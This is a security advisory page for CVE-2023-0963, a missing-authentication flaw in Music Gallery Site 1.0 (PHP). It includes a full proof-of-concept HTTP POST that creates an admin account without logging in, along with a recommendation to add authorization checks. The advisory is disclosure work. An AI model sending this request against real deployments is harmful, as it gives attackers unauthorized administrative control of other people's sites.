---
title: Music Gallery Site 1.0 Privilege Escalation / Missing Authentication
url: https://cxsecurity.com/issue/WLB-2023020044
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-27
fetch_date: 2025-10-04T08:09:48.841385
---

# Music Gallery Site 1.0 Privilege Escalation / Missing Authentication

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Music Gallery Site 1.0 Privilege Escalation / Missing Authentication** **2023.02.26**  Credit:  **[Navaid Ansari](https://cxsecurity.com/author/Navaid%2BAnsari/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2023-0963](https://cxsecurity.com/cveshow/CVE-2023-0963/ "Click to see CVE-2023-0963")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Music Gallery Site - Broken Access Control leads to compromise of complete application by adding admin user without log-in into the application.
### Date:
> 21 February 2023
### CVE Assigned:
\*\*[CVE-2023-0963](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0963)\*\* [mitre.org](https://www.cve.org/CVERecord?id=CVE-2023-0963) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2023-0963)
### Author Email:
> navaidnasari@hotmail.co.uk
### Vendor Homepage:
> https://www.sourcecodester.com
### Software Link:
> [Music Gallery Site](https://www.sourcecodester.com/php/16073/music-gallery-site-using-php-and-mysql-database-free-source-code.html)
### Version:
> v 1.0
### Broken Authentication:
> Broken Access Control is a type of security vulnerability that occurs when a web application fails to properly restrict users' access to certain resources and functionality. Access control is the process of ensuring that users are authorized to access only the resources and functionality that they are supposed to. Broken Access Control can occur due to poor implementation of access controls in the application, failure to validate input, or insufficient testing and review.
### Vulnerable URLs:
> /php-music/classes/Users.php
>/php-music/classes/Master.php
### Affected Page:
> Users.php , Master.php
> On these page, application isn't verifying the authenticated mechanism. Due to that, all the parameters are vulnerable to broken access control and any remote attacker could create and update the data into the application. Specifically, Users.php could allow to remote attacker to create a admin user without log-in to the application.
### Description:
> Broken access control allows any remote attacker to create, update and delete the data of the application. Specifically, adding the admin users
### Proof of Concept:
> Following steps are involved:
1. Send a POST request with required parameter to Users.php?f=save (See Below Request)
2. Request:
```
POST /php-music/classes/Users.php?f=save HTTP/1.1
Host: localhost
Content-Length: 876
sec-ch-ua: "Not?A\_Brand";v="8", "Chromium";v="108"
Accept: \*/\*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjwBNagY7zt6cjYHp
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
sec-ch-ua-platform: "Linux"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/php-music/admin/?page=user/manage\_user
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
------WebKitFormBoundaryjwBNagY7zt6cjYHp
Content-Disposition: form-data; name="id"
------WebKitFormBoundaryjwBNagY7zt6cjYHp
Content-Disposition: form-data; name="firstname"
Test
------WebKitFormBoundaryjwBNagY7zt6cjYHp
Content-Disposition: form-data; name="middlename"
Admin
------WebKitFormBoundaryjwBNagY7zt6cjYHp
Content-Disposition: form-data; name="lastname"
Check
------WebKitFormBoundaryjwBNagY7zt6cjYHp
Content-Disposition: form-data; name="username"
testadmin
------WebKitFormBoundaryjwBNagY7zt6cjYHp
Content-Disposition: form-data; name="password"
test123
------WebKitFormBoundaryjwBNagY7zt6cjYHp
Content-Disposition: form-data; name="type"
1
------WebKitFormBoundaryjwBNagY7zt6cjYHp
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream
------WebKitFormBoundaryjwBNagY7zt6cjYHp--
```
3. It will create the user by defining the valid values (see below screenshot of successfull response), Successful exploit screenshots are below (without cookie parameter)
![image](https://user-images.githubusercontent.com/123810418/220352229-389dfaf8-57e0-470d-b8a5-c873a13b3b51.png)
![image](https://user-images.githubusercontent.com/123810418/220352493-ef35a8ba-c613-4745-9004-0159b3841951.png)
4. Vulnerable Code Snippets:
Users.php
![image](https://user-images.githubusercontent.com/123810418/220353008-b1448508-7451-412a-a5eb-049aa20b3d41.png)
Master.php
![image](https://user-images.githubusercontent.com/123810418/220353132-1067a86c-282d-4fc5-8733-ceab4b1fef56.png)
### Recommendation:
> Whoever uses this CMS, should update the authorization mechanism on top of the Users.php , Master.php pages as per requirement to avoid a Broken Access Control attack:

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020044)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top